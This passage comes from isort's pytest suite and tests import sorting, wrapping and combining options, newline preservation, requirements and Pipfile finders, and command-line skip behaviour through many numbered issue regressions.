'\\n'\n                       'VAR = \"\"\"\\n'\n                       'multiline text\\n'\n                       '\"\"\"\\n')\n    assert SortImports(file_contents=test_input).output == expected_output\n\n\ndef test_to_ensure_importing_from_imports_module_works_issue_662():\n    test_input = ('@wraps(fun)\\n'\n                  'def __inner(*args, **kwargs):\\n'\n                  '    from .imports import qualname\\n'\n                  '    warn(description=description or qualname(fun), deprecation=deprecation, removal=removal)\\n')\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_to_ensure_no_unexpected_changes_issue_666():\n    test_input = ('from django.conf import settings\\n'\n                  'from django.core.management import call_command\\n'\n                  'from django.core.management.base import BaseCommand\\n'\n                  'from django.utils.translation import ugettext_lazy as _\\n'\n                  '\\n'\n                  'TEMPLATE = \"\"\"\\n'\n                  '# This file is generated automatically with the management command\\n'\n                  '#\\n'\n                  '#    manage.py bis_compile_i18n\\n'\n                  '#\\n'\n                  '# please dont change it manually.\\n'\n                  'from django.utils.translation import ugettext_lazy as _\\n'\n                  '\"\"\"\\n')\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_to_ensure_tabs_dont_become_space_issue_665():\n    test_input = ('import os\\n'\n                  '\\n'\n                  '\\n'\n                  'def my_method():\\n'\n                  '\\tpass\\n')\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_new_lines_are_preserved():\n    with NamedTemporaryFile('w', suffix='py', delete=False) as rn_newline:\n        pass\n\n    try:\n        with io.open(rn_newline.name, mode='w', newline='') as rn_newline_input:\n            rn_newline_input.write('import sys\\r\\nimport os\\r\\n')\n\n        SortImports(rn_newline.name, settings_path=os.getcwd())\n        with io.open(rn_newline.name) as new_line_file:\n            print(new_line_file.read())\n        with io.open(rn_newline.name, newline='') as rn_newline_file:\n            rn_newline_contents = rn_newline_file.read()\n        assert rn_newline_contents == 'import os\\r\\nimport sys\\r\\n'\n    finally:\n        os.remove(rn_newline.name)\n\n    with NamedTemporaryFile('w', suffix='py', delete=False) as r_newline:\n        pass\n\n    try:\n        with io.open(r_newline.name, mode='w', newline='') as r_newline_input:\n            r_newline_input.write('import sys\\rimport os\\r')\n\n        SortImports(r_newline.name, settings_path=os.getcwd())\n        with io.open(r_newline.name, newline='') as r_newline_file:\n            r_newline_contents = r_newline_file.read()\n        assert r_newline_contents == 'import os\\rimport sys\\r'\n    finally:\n        os.remove(r_newline.name)\n\n    with NamedTemporaryFile('w', suffix='py', delete=False) as n_newline:\n        pass\n\n    try:\n        with io.open(n_newline.name, mode='w', newline='') as n_newline_input:\n            n_newline_input.write('import sys\\nimport os\\n')\n\n        SortImports(n_newline.name, settings_path=os.getcwd())\n        with io.open(n_newline.name, newline='') as n_newline_file:\n            n_newline_contents = n_newline_file.read()\n        assert n_newline_contents == 'import os\\nimport sys\\n'\n    finally:\n        os.remove(n_newline.name)\n\n\ndef test_requirements_finder(tmpdir):\n    subdir = tmpdir.mkdir('subdir').join(\"lol.txt\")\n    subdir.write(\"flask\")\n    req_file = tmpdir.join('requirements.txt')\n    req_file.write(\n        \"Django==1.11\\n\"\n        \"-e git+https://github.com/orsinium/deal.git#egg=deal\\n\"\n    )\n    si = SortImports(file_contents=\"\")\n    for path in (str(tmpdir), str(subdir)):\n        finder = finders.RequirementsFinder(\n            config=si.config,\n            sections=si.sections,\n            path=path\n        )\n\n        files = list(finder._get_files())\n        assert len(files) == 1  # file finding\n        assert files[0].endswith('requirements.txt')  # file finding\n        assert set(finder._get_names(str(req_file))) == {'Django', 'deal'}  # file parsing\n\n        assert finder.find(\"django\") == si.sections.THIRDPARTY  # package in reqs\n        assert finder.find(\"flask\") is None  # package not in reqs\n        assert finder.find(\"deal\") == si.sections.THIRDPARTY  # vcs\n\n        assert len(finder.mapping) > 100\n        assert finder._normalize_name('deal') == 'deal'\n        assert finder._normalize_name('Django') == 'django'  # lowercase\n        assert finder._normalize_name('django_haystack') == 'haystack'  # mapping\n        assert finder._normalize_name('Flask-RESTful') == 'flask_restful'  # conver `-`to `_`\n\n    req_file.remove()\n\n\ndef test_forced_separate_is_deterministic_issue_774(tmpdir):\n\n    config_file = tmpdir.join('setup.cfg')\n    config_file.write(\n        \"[isort]\\n\"\n        \"forced_separate:\\n\"\n        \"   separate1\\n\"\n        \"   separate2\\n\"\n        \"   separate3\\n\"\n        \"   separate4\\n\"\n    )\n\n    test_input = ('import time\\n'\n                  '\\n'\n                  'from separate1 import foo\\n'\n                  '\\n'\n                  'from separate2 import bar\\n'\n                  '\\n'\n                  'from separate3 import baz\\n'\n                  '\\n'\n                  'from separate4 import quux\\n')\n\n    assert SortImports(file_contents=test_input, settings_path=config_file.strpath).output == test_input\n\n\nPIPFILE = \"\"\"\n[[source]]\nurl = \"https://pypi.org/simple\"\nverify_ssl = true\nname = \"pypi\"\n\n[requires]\npython_version = \"3.5\"\n\n[packages]\nDjango = \"~=1.11\"\ndeal = {editable = true, git = \"https://github.com/orsinium/deal.git\"}\n\n[dev-packages]\n\"\"\"\n\n\ndef test_pipfile_finder(tmpdir):\n    pipfile = tmpdir.join('Pipfile')\n    pipfile.write(PIPFILE)\n    si = SortImports(file_contents=\"\")\n    finder = finders.PipfileFinder(\n        config=si.config,\n        sections=si.sections,\n        path=str(tmpdir)\n    )\n\n    assert set(finder._get_names(str(tmpdir))) == {'Django', 'deal'}  # file parsing\n\n    assert finder.find(\"django\") == si.sections.THIRDPARTY  # package in reqs\n    assert finder.find(\"flask\") is None  # package not in reqs\n    assert finder.find(\"deal\") == si.sections.THIRDPARTY  # vcs\n\n    assert len(finder.mapping) > 100\n    assert finder._normalize_name('deal') == 'deal'\n    assert finder._normalize_name('Django') == 'django'  # lowercase\n    assert finder._normalize_name('django_haystack') == 'haystack'  # mapping\n    assert finder._normalize_name('Flask-RESTful') == 'flask_restful'  # conver `-`to `_`\n\n    pipfile.remove()\n\n\ndef test_monkey_patched_urllib():\n    with pytest.raises(ImportError):\n        # Previous versions of isort monkey patched urllib which caused unusual\n        # importing for other projects.\n        from urllib import quote  # type: ignore  # noqa: F401\n\n\ndef test_path_finder(monkeypatch):\n    si = SortImports(file_contents=\"\")\n    finder = finders.PathFinder(\n        config=si.config,\n        sections=si.sections,\n    )\n    third_party_prefix = next(path for path in finder.paths if \"site-packages\" in path)\n    ext_suffix = sysconfig.get_config_var(\"EXT_SUFFIX\") or \".so\"\n    imaginary_paths = set([\n        posixpath.join(finder.stdlib_lib_prefix, \"example_1.py\"),\n        posixpath.join(third_party_prefix, \"example_2.py\"),\n        posixpath.join(third_party_prefix, \"example_3.so\"),\n        posixpath.join(third_party_prefix, \"example_4\" + ext_suffix),\n        posixpath.join(os.getcwd(), \"example_5.py\"),\n    ])\n    monkeypatch.setattr(\"isort.finders.exists_case_sensitive\", lambda p: p in imaginary_paths)\n    assert finder.find(\"example_1\") == finder.sections.STDLIB\n    assert finder.find(\"example_2\") == finder.sections.THIRDPARTY\n    assert finder.find(\"example_3\") == finder.sections.THIRDPARTY\n    assert finder.find(\"example_4\") == finder.sections.THIRDPARTY\n    assert finder.find(\"example_5\") == finder.sections.FIRSTPARTY\n\n\ndef test_argument_parsing():\n    from isort.main import parse_args\n    args = parse_args(['-dt', '-t', 'foo', '--skip=bar', 'baz.py'])\n    assert args['order_by_type'] is False\n    assert args['force_to_top'] == ['foo']\n    assert args['skip'] == ['bar']\n    assert args['files'] == ['baz.py']\n\n\n@pytest.mark.parametrize('multiprocess', (False, True))\ndef test_command_line(tmpdir, capfd, multiprocess):\n    from isort.main import main\n    tmpdir.join(\"file1.py\").write(\"import re\\nimport os\\n\\nimport contextlib\\n\\n\\nimport isort\")\n    tmpdir.join(\"file2.py\").write(\"import collections\\nimport time\\n\\nimport abc\\n\\n\\nimport isort\")\n    arguments = [\"-rc\", str(tmpdir), '--settings-path', os.getcwd()]\n    if multiprocess:\n        arguments.extend(['--jobs', '2'])\n    main(arguments)\n    assert tmpdir.join(\"file1.py\").read() == \"import contextlib\\nimport os\\nimport re\\n\\nimport isort\\n\"\n    assert tmpdir.join(\"file2.py\").read() == \"import abc\\nimport collections\\nimport time\\n\\nimport isort\\n\"\n    if not sys.platform.startswith('win'):\n        out, err = capfd.readouterr()\n        assert not err\n        # it informs us about fixing the files:\n        assert str(tmpdir.join(\"file1.py\")) in out\n        assert str(tmpdir.join(\"file2.py\")) in out\n\n\n@pytest.mark.parametrize(\"quiet\", (False, True))\ndef test_quiet(tmpdir, capfd, quiet):\n    if sys.platform.startswith(\"win\"):\n        return\n    from isort.main import main\n    tmpdir.join(\"file1.py\").write(\"import re\\nimport os\")\n    tmpdir.join(\"file2.py\").write(\"\")\n    arguments = [\"-rc\", str(tmpdir)]\n    if quiet:\n        arguments.append(\"-q\")\n    main(arguments)\n    out, err = capfd.readouterr()\n    assert not err\n    assert bool(out) != quiet\n\n\n@pytest.mark.parametrize('enabled', (False, True))\ndef test_safety_excludes(tmpdir, enabled):\n    tmpdir.join(\"victim.py\").write(\"# ...\")\n    toxdir = tmpdir.mkdir(\".tox\")\n    toxdir.join(\"verysafe.py\").write(\"# ...\")\n    tmpdir.mkdir(\"lib\").mkdir(\"python3.7\").join(\"importantsystemlibrary.py\").write(\"# ...\")\n    tmpdir.mkdir(\".pants.d\").join(\"pants.py\").write(\"import os\")\n    config = dict(settings.default.copy(), safety_excludes=enabled)\n    skipped = []  # type: List[str]\n    codes = [str(tmpdir)]\n    main.iter_source_code(codes, config, skipped)\n\n    # if enabled files within nested unsafe directories should be skipped\n    file_names = set(os.path.relpath(f, str(tmpdir)) for f in main.iter_source_code([str(tmpdir)], config, skipped))\n    if enabled:\n        assert file_names == {'victim.py'}\n        assert len(skipped) == 3\n    else:\n        assert file_names == {os.sep.join(('.tox', 'verysafe.py')),\n                              os.sep.join(('lib', 'python3.7', 'importantsystemlibrary.py')),\n                              os.sep.join(('.pants.d', 'pants.py')),\n                              'victim.py'}\n        assert not skipped\n\n    # directly pointing to files within unsafe directories shouldn't skip them either way\n    file_names = set(os.path.relpath(f, str(toxdir)) for f in main.iter_source_code([str(toxdir)], config, skipped))\n    assert file_names == {'verysafe.py'}\n\n\n@pytest.mark.parametrize('skip_glob_assert', (([], 0, {os.sep.join(('code', 'file.py'))}), (['**/*.py'], 1, {}),\n                                              (['*/code/*.py'], 1, {})))\ndef test_skip_glob(tmpdir, skip_glob_assert):\n    skip_glob, skipped_count, file_names = skip_glob_assert\n    base_dir = tmpdir.mkdir('build')\n    code_dir = base_dir.mkdir('code')\n    code_dir.join('file.py').write('import os')\n\n    config = dict(settings.default.copy(), skip_glob=skip_glob)\n    skipped = []  # type: List[str]\n    file_names = set(os.path.relpath(f, str(base_dir)) for f in main.iter_source_code([str(base_dir)], config, skipped))\n    assert len(skipped) == skipped_count\n    assert file_names == file_names\n\n\ndef test_comments_not_removed_issue_576():\n    test_input = ('import distutils\\n'\n                  '# this comment is important and should not be removed\\n'\n                  'from sys import api_version as api_version\\n')\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_reverse_relative_imports_issue_417():\n    test_input = ('from . import ipsum\\n'\n                  'from . import lorem\\n'\n                  'from .dolor import consecteur\\n'\n                  'from .sit import apidiscing\\n'\n                  'from .. import donec\\n'\n                  'from .. import euismod\\n'\n                  'from ..mi import iaculis\\n'\n                  'from ..nec import tempor\\n'\n                  'from ... import diam\\n'\n                  'from ... import dui\\n'\n                  'from ...eu import dignissim\\n'\n                  'from ...ex import metus\\n')\n    assert SortImports(file_contents=test_input,\n                       force_single_line=True,\n                       reverse_relative=True).output == test_input\n\n\ndef test_inconsistent_relative_imports_issue_577():\n    test_input = ('from ... import diam\\n'\n                  'from ... import dui\\n'\n                  'from ...eu import dignissim\\n'\n                  'from ...ex import metus\\n'\n                  'from .. import donec\\n'\n                  'from .. import euismod\\n'\n                  'from ..mi import iaculis\\n'\n                  'from ..nec import tempor\\n'\n                  'from . import ipsum\\n'\n                  'from . import lorem\\n'\n                  'from .dolor import consecteur\\n'\n                  'from .sit import apidiscing\\n')\n    assert SortImports(file_contents=test_input, force_single_line=True).output == test_input\n\n\ndef test_unwrap_issue_762():\n    test_input = ('from os.path \\\\\\n'\n                  'import (join, split)\\n')\n    assert SortImports(file_contents=test_input).output == 'from os.path import join, split\\n'\n\n    test_input = ('from os.\\\\\\n'\n                  '    path import (join, split)')\n    assert SortImports(file_contents=test_input).output == 'from os.path import join, split\\n'\n\n\ndef test_multiple_as_imports():\n    test_input = ('from a import b as b\\n'\n                  'from a import b as bb\\n'\n                  'from a import b as bb_\\n')\n    test_output = SortImports(file_contents=test_input).output\n    assert test_output == test_input\n    test_output = SortImports(file_contents=test_input, combine_as_imports=True).output\n    assert test_output == 'from a import b as b, b as bb, b as bb_\\n'\n    test_output = SortImports(file_contents=test_input, keep_direct_and_as_imports=True).output\n    assert test_output == test_input\n    test_output = SortImports(file_contents=test_input, combine_as_imports=True, keep_direct_and_as_imports=True).output\n    assert test_output == 'from a import b as b, b as bb, b as bb_\\n'\n\n    test_input = ('from a import b\\n'\n                  'from a import b as b\\n'\n                  'from a import b as bb\\n'\n                  'from a import b as bb_\\n')\n    test_output = SortImports(file_contents=test_input).output\n    assert test_output == 'from a import b as b\\nfrom a import b as bb\\nfrom a import b as bb_\\n'\n    test_output = SortImports(file_contents=test_input, combine_as_imports=True).output\n    assert test_output == 'from a import b as b, b as bb, b as bb_\\n'\n    test_output = SortImports(file_contents=test_input, keep_direct_and_as_imports=True).output\n    assert test_output == test_input\n    test_output = SortImports(file_contents=test_input, combine_as_imports=True, keep_direct_and_as_imports=True).output\n    assert test_output == 'from a import b, b as b, b as bb, b as bb_\\n'\n\n    test_input = ('from a import b as e\\n'\n                  'from a import b as c\\n'\n                  'from a import b\\n'\n                  'from a import b as f\\n')\n    test_output = SortImports(file_contents=test_input).output\n    assert test_output == 'from a import b as c\\nfrom a import b as e\\nfrom a import b as f\\n'\n    test_output = SortImports(file_contents=test_input, combine_as_imports=True).output\n    assert test_output == 'from a import b as c, b as e, b as f\\n'\n    test_output = SortImports(file_contents=test_input, keep_direct_and_as_imports=True).output\n    assert test_output == 'from a import b\\nfrom a import b as c\\nfrom a import b as e\\nfrom a import b as f\\n'\n    test_output = SortImports(file_contents=test_input, no_inline_sort=True).output\n    assert test_output == 'from a import b as c\\nfrom a import b as e\\nfrom a import b as f\\n'\n    test_output = SortImports(file_contents=test_input, keep_direct_and_as_imports=True, no_inline_sort=True).output\n    assert test_output == 'from a import b\\nfrom a import b as c\\nfrom a import b as e\\nfrom a import b as f\\n'\n    test_output = SortImports(file_contents=test_input, combine_as_imports=True, keep_direct_and_as_imports=True).output\n    assert test_output == 'from a import b, b as c, b as e, b as f\\n'\n    test_output = SortImports(file_contents=test_input, combine_as_imports=True, no_inline_sort=True).output\n    assert test_output == 'from a import b as e, b as c, b as f\\n'\n    test_output = SortImports(file_contents=test_input, combine_as_imports=True, keep_direct_and_as_imports=True, no_inline_sort=True).output\n    assert test_output == 'from a import b, b as e, b as c, b as f\\n'\n\n    test_input = ('import a as a\\n'\n                  'import a as aa\\n'\n                  'import a as aa_\\n')\n    test_output = SortImports(file_contents=test_input).output\n    assert test_output == test_input\n    test_output = SortImports(file_contents=test_input, combine_as_imports=True, keep_direct_and_as_imports=True).output\n    assert test_output == test_input\n\n    test_input = ('import a\\n'\n                  'import a as a\\n'\n                  'import a as aa\\n'\n                  'import a as aa_\\n')\n    test_output = SortImports(file_contents=test_input).output\n    assert test_output == 'import a as a\\nimport a as aa\\nimport a as aa_\\n'\n    test_output = SortImports(file_contents=test_input, combine_as_imports=True, keep_direct_and_as_imports=True).output\n    assert test_output == test_input\n\n\ndef test_all_imports_from_single_module():\n    test_input = ('import a\\n'\n                  'from a import *\\n'\n                  'from a import b as d\\n'\n                  'from a import z, x, y\\n'\n                  'from a import b\\n'\n                  'from a import w, i as j\\n'\n                  'from a import b as c, g as h\\n'\n                  'from a import e as f\\n')\n    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,\n                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=False).output\n    assert test_output == ('import a\\n'\n                           'from a import *\\n'\n                           'from a import b as c\\n'\n                           'from a import b as d\\n'\n                           'from a import e as f\\n'\n                           'from a import g as h\\n'\n                           'from a import i as j\\n'\n                           'from a import w, x, y, z\\n')\n    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=False,\n                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=False).output\n    assert test_output == 'import a\\nfrom a import *\\n'\n    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=True,\n                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=False).output\n    assert test_output == ('import a\\n'\n                           'from a import *\\n'\n                           'from a import b as c, b as d, e as f, g as h, i as j, w, x, y, z\\n')\n    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,\n                              keep_direct_and_as_imports=True, force_single_line=False, no_inline_sort=False).output\n    assert test_output == ('import a\\n'\n                           'from a import *\\n'\n                           'from a import b\\n'\n                           'from a import b as c\\n'\n                           'from a import b as d\\n'\n                           'from a import e as f\\n'\n                           'from a import g as h\\n'\n                           'from a import i as j\\n'\n                           'from a import w, x, y, z\\n')\n    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,\n                              keep_direct_and_as_imports=False, force_single_line=True, no_inline_sort=False).output\n    assert test_output == ('import a\\n'\n                           'from a import *\\n'\n                           'from a import b as c\\n'\n                           'from a import b as d\\n'\n                           'from a import e as f\\n'\n                           'from a import g as h\\n'\n                           'from a import i as j\\n'\n                           'from a import w\\n'\n                           'from a import x\\n'\n                           'from a import y\\n'\n                           'from a import z\\n')\n    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,\n                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=True).output\n    assert test_output == ('import a\\n'\n                           'from a import *\\n'\n                           'from a import b as c\\n'\n                           'from a import b as d\\n'\n                           'from a import z, x, y, w\\n'\n                           'from a import i as j\\n'\n                           'from a import g as h\\n'\n                           'from a import e as f\\n')\n    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=True,\n                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=False).output\n    assert test_output == 'import a\\nfrom a import *\\n'\n    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=False,\n                              keep_direct_and_as_imports=True, force_single_line=False, no_inline_sort=False).output\n    assert test_output == 'import a\\nfrom a import *\\n'\n    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=False,\n                              keep_direct_and_as_imports=False, force_single_line=True, no_inline_sort=False).output\n    assert test_output == 'import a\\nfrom a import *\\n'\n    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=False,\n                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=True).output\n    assert test_output == 'import a\\nfrom a import *\\n'\n    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=True,\n                              keep_direct_and_as_imports=True, force_single_line=False, no_inline_sort=False).output\n    assert test_output == ('import a\\n'\n                           'from a import *\\n'\n                           'from a import b, b as c, b as d, e as f, g as h, i as j, w, x, y, z\\n')\n    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=True,\n                              keep_direct_and_as_imports=False, force_single_line=True, no_inline_sort=False).output\n    assert test_output == ('import a\\n'\n                           'from a import *\\n'\n                           'from a import b as c\\n'\n                           'from a import b as d\\n'\n                           'from a import e as f\\n'\n                           'from a import g as h\\n'\n                           'from a import i as j\\n'\n                           'from a import w\\n'\n                           'from a import x\\n'\n                           'from a import y\\n'\n                           'from a import z\\n')\n    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=True,\n                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=True).output\n    assert test_output == ('import a\\n'\n                           'from a import *\\n'\n                           'from a import b as d, b as c, z, x, y, w, i as j, g as h, e as f\\n')\n    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,\n                              keep_direct_and_as_imports=True, force_single_line=True, no_inline_sort=False).output\n    assert test_output == ('import a\\n'\n                           'from a import *\\n'\n                           'from a import b\\n'\n                           'from a import b as c\\n'\n                           'from a import b as d\\n'\n                           'from a import e as f\\n'\n                           'from a import g as h\\n'\n                           'from a import i as j\\n'\n                           'from a import w\\n'\n                           'from a import x\\n'\n                           'from a import y\\n'\n                           'from a import z\\n')\n    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,\n                              keep_direct_and_as_imports=True, force_single_line=False, no_inline_sort=True).output\n    assert test_output == ('import a\\n'\n                           'from a import *\\n'\n                           'from a import b\\n'\n                           'from a import b as c\\n'\n                           'from a import b as d\\n'\n                           'from a import z, x, y, w\\n'\n                           'from a import i as j\\n'\n                           'from a import g as h\\n'\n                           'from a import e as f\\n')\n    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,\n                              keep_direct_and_as_imports=False, force_single_line=True, no_inline_sort=True).output\n    assert test_output == ('import a\\n'\n                           'from a import *\\n'\n                           'from a import b as c\\n'\n                           'from a import b as d\\n'\n                           'from a import e as f\\n'\n                           'from a import g as h\\n'\n                           'from a import i as j\\n'\n                           'from a import w\\n'\n                           'from a import x\\n'\n                           'from a import y\\n'\n                           'from a import z\\n')\n    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=True,\n                              keep_direct_and_as_imports=True, force_single_line=False, no_inline_sort=False).output\n    assert test_output == 'import a\\nfrom a import *\\n'\n    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=True,\n                              keep_direct_and_as_imports=False, force_single_line=True, no_inline_sort=False).output\n    assert test_output == 'import a\\nfrom a import *\\n'\n    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=True,\n                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=True).output\n    assert test_output == 'import a\\nfrom a import *\\n'\n    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=False,\n                              keep_direct_and_as_imports=True, force_single_line=True, no_inline_sort=False).output\n    assert test_output == 'import a\\nfrom a import *\\n'\n    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=False,\n                              keep_direct_and_as_imports=True, force_single_line=False, no_inline_sort=True).output\n    assert test_output == 'import a\\nfrom a import *\\n'\n    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=False,\n                              keep_direct_and_as_imports=False, force_single_line=True, no_inline_sort=True).output\n    assert test_output == 'import a\\nfrom a import *\\n'\n    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=True,\n                              keep_direct_and_as_imports=True, force_single_line=True, no_inline_sort=False).output\n    assert test_output == ('import a\\n'\n                           'from a import *\\n'\n                           'from a import b\\n'\n                           'from a import b as c\\n'\n                           'from a import b as d\\n'\n                           'from a import e as f\\n'\n                           'from a import g as h\\n'\n                           'from a import i as j\\n'\n                           'from a import w\\n'\n                           'from a import x\\n'\n                           'from a import y\\n'\n                           'from a import z\\n')\n    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=True,\n                              keep_direct_and_as_imports=True, force_single_line=False, no_inline_sort=True).output\n    assert test_output == ('import a\\n'\n                           'from a import *\\n'\n                           'from a import b, b as d, b as c, z, x, y, w, i as j, g as h, e as f\\n')\n    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,\n                              keep_direct_and_as_imports=True, force_single_line=True, no_inline_sort=True).output\n    assert test_output == ('import a\\n'\n                           'from a import *\\n'\n                           'from a import b\\n'\n                           'from a import b as c\\n'\n                           'from a import b as d\\n'\n                           'from a import e as f\\n'\n                           'from a import g as h\\n'\n                           'from a import i as j\\n'\n                           'from a import w\\n'\n                           'from a import x\\n'\n                           'from a import y\\n'\n                           'from a import z\\n')\n    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=True,\n                              keep_direct_and_as_imports=True, force_single_line=True, no_inline_sort=False).output\n    assert test_output == 'import a\\nfrom a import *\\n'\n\n\ndef test_noqa_issue_679():\n    # Test to ensure that NOQA notation is being observed as expected\n    test_input = ('import os\\n'\n                  '\\n'\n                  'import requestsss\\n'\n                  'import zed # NOQA\\n'\n                  'import ujson # NOQA\\n'\n                  '\\n'\n                  'import foo')\n    test_output = ('import os\\n'\n                   '\\n'\n                   'import foo\\n'\n                   'import requestsss\\n'\n                   '\\n'\n                   'import zed # NOQA\\n'\n                   'import ujson # NOQA\\n')\n    assert SortImports(file_contents=test_input).output == test_output\n\n\ndef test_extract_multiline_output_wrap_setting_from_a_config_file(tmpdir: py.path.local) -> None:\n    editorconfig_contents = [\n        'root = true',\n        ' [*.py]',\n        'multi_line_output = 5'\n    ]\n    config_file = tmpdir.join('.editorconfig')\n    config_file.write('\\n'.join(editorconfig_contents))\n\n    config = settings.from_path(str(tmpdir))\n    assert config['multi_line_output'] == WrapModes.VERTICAL_GRID_GROUPED\n\n\ndef test_ensure_support_for_non_typed_but_cased_alphabetic_sort_issue_890():\n    test_input = ('from pkg import BALL\\n'\n                  'from pkg import RC\\n'\n                  'from pkg import Action\\n'\n                  'from pkg import Bacoo\\n'\n                  'from pkg import RCNewCode\\n'\n                  'from pkg import actual\\n'\n                  'from pkg import rc\\n'\n                  'from pkg import recorder\\n')\n    expected_output = ('from pkg import Action\\n'\n                       'from pkg import BALL\\n'\n                       'from pkg import Bacoo\\n'\n                       'from pkg import RC\\n'\n                       'from pkg import RCNewCode\\n'\n                       'from pkg import actual\\n'\n                       'from pkg import rc\\n'\n                       'from pkg import recorder\\n')\n    assert SortImports(file_contents=test_input, case_sensitive=True, order_by_type=False,\n                       force_single_line=True).output == expected_output\n\n\ndef test_to_ensure_empty_line_not_added_to_file_start_issue_889():\n    test_input = ('# comment\\n'\n                  'import os\\n'\n                  '# comment2\\n'\n                  'import sys\\n')\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_to_ensure_correctly_handling_of_whitespace_only_issue_811(capsys):\n    test_input = ('import os\\n'\n                  'import sys\\n'\n                  '\\n'\n                  '\\x0c\\n'\n                  'def my_function():\\n'\n                  '    print(\"hi\")\\n')\n    SortImports(file_contents=test_input, ignore_whitespace=True)\n    out, err = capsys.readouterr()\n    assert out == ''\n    assert err == ''\n\n\ndef test_standard_library_deprecates_user_issue_778():\n    test_input = ('import os\\n'\n                  '\\n'\n                  'import user\\n')\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_settings_path_skip_issue_909(tmpdir):\n    base_dir = tmpdir.mkdir('project')\n    config_dir = base_dir.mkdir('conf')\n    config_dir.join('.isort.cfg').write('[isort]\\n'\n                                        'skip =\\n'\n                                        '    file_to_be_skipped.py\\n'\n                                        'skip_glob =\\n'\n                                        '    *glob_skip*\\n')\n\n    base_dir.join('file_glob_skip.py').write('import os\\n'\n                                             '\\n'\n                                             'print(\"Hello World\")\\n'\n                                             '\\n'\n                                             'import sys\\n')\n    base_dir.join('file_to_be_skipped.py').write('import os\\n'\n                                                 '\\n'\n                                                 'print(\"Hello World\")'\n                                                 '\\n'\n                                                 'import sys\\n')\n\n    test_run_directory = os.getcwd()\n    os.chdir(str(base_dir))\n    with pytest.raises(Exception):  # without the settings path provided: the command should not skip & identify errors\n        subprocess.run(['isort', '--check-only'], check=True)\n    result = subprocess.run(\n        ['isort', '--check-only', '--settings-path=conf/.isort.cfg'],\n        stdout=subprocess.PIPE,\n        check=True\n    )\n    os.chdir(str(test_run_directory))\n\n    assert b'skipped 2' in result.stdout.lower()\n\n\ndef test_skip_paths_issue_938(tmpdir):\n    base_dir = tmpdir.mkdir('project')\n    config_dir = base_dir.mkdir('conf')\n    config_dir.join('.isort.cfg').write('[isort]\\n'\n                                        'line_length = 88\\n'\n                                        'multi_line_output = 4\\n'\n                                        'lines_after_imports = 2\\n'\n                                        'skip_glob =\\n'\n                                        '    migrations/**.py\\n')\n    base_dir.join('dont_skip.py').write('import os\\n'\n                                        '\\n'\n                                        'print(\"Hello World\")'\n                                        '\\n'\n                                        'import sys\\n')\n\n    migrations_dir = base_dir.mkdir('migrations')\n    migrations_dir.join('file_glob_skip.py').write('import os\\n'\n                                                   '\\n'\n                                                   'print(\"Hello World\")\\n'\n                                                   '\\n'\n                                                   'import sys\\n')\n\n    test_run_directory = os.getcwd()\n    os.chdir(str(base_dir))\n    result = subprocess.run(\n        ['isort', 'dont_skip.py', 'migrations/file_glob_skip.py'],\n        stdout=subprocess.PIPE,\n        check=True,\n    )\n    os.chdir(str(test_run_directory))\n\n    assert b'skipped' not in result.stdout.lower()\n\n    os.chdir(str(base_dir))\n    result = subprocess.run(\n        ['isort', '--filter-files', '--settings-path=conf/.isort.cfg', 'dont_skip.py', 'migrations/file_glob_skip.py'],\n        stdout=subprocess.PIPE,\n        check=True,\n    )\n    os.chdir(str(test_run_directory))\n\n    assert b'skipped 1' in result.stdout.lower()\n\n\ndef test_failing_file_check_916():\n    test_input = ('#!/usr/bin/env python\\n'\n                  '# -*- coding: utf-8 -*-\\n'\n                  'from __future__ import unicode_literals\\n')\n    expected_output = ('#!/usr/bin/env python\\n'\n                       '# -*- coding: utf-8 -*-\\n'\n                       '# FUTURE\\n'\n                       'from __future__ import unicode_literals\\n')\n    settings = {'known_future_library': 'future',\n                'import_heading_future': 'FUTURE',\n                'sections': ['FUTURE', 'STDLIB', 'NORDIGEN', 'FIRSTPARTY', 'THIRDPARTY', 'LOCALFOLDER'],\n                'indent': '    ',\n                'multi_line_output': 3,\n                'lines_after_imports': 2}  # type: Dict[str, Any]\n    assert SortImports(file_contents=test_input, **settings).output == expected_output\n    assert SortImports(file_contents=expected_output, **settings).output == expected_output\n    assert not SortImports(file_contents=expected_output, check=True, **settings).incorrectly_sorted\n\n\ndef test_import_heading_issue_905():\n    config = 